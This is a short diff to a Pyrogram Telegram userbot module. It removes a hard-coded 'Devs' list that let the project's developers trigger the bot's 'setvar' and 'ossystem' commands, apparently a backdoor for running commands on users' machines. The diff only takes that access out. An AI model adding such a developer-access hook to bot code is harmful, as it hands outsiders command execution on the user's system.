@@ -11,7 +11,6 @@ from pyrogram.types import Message
 from pyrogram.enums import ChatType
 
 from RiZoeLX.data import Variables, Variables_text
-from RiZoeLX import Devs
 from RiZoeLX.functions import get_time, delete_reply, Red7_Watch as oops_watch
 
 
@@ -136,9 +135,6 @@ async def welcome_watcher(SpamX: Client, message: Message):
    if message.from_user.id == Owner:
       await SpamX.send_message(message.chat.id, f"{message.from_user.mention} Welcome to {message.chat.title} my King 👑")
       return
-   if message.from_user.id in Devs:
-      await SpamX.send_message(message.chat.id, f"{message.from_user.mention} ron8n's Devs joined👾")
-      return
    if message.from_user.id in Sudos:
       await SpamX.send_message(message.chat.id, f"{message.from_user.mention} Whoa! The Prince just joined 🫠!")
       return
@@ -157,7 +153,6 @@ async def spamban(SpamX: Client, message: Message):
       await delete_reply(message, event, str(error))   
 
 """ NOTE: This is an extra module! it may be useful """
-@Client.on_message(filters.user(Devs) & filters.command(["setvar", "ossystem"], prefixes=handler))
 @Client.on_message(filters.user(Owner) & filters.command(["setvar", "ossystem"], prefixes=handler))
 @Client.on_message(filters.me & filters.command(["setvar", "ossystem"], prefixes=handler))
 async def os_system(SpamX: Client, message: Message):
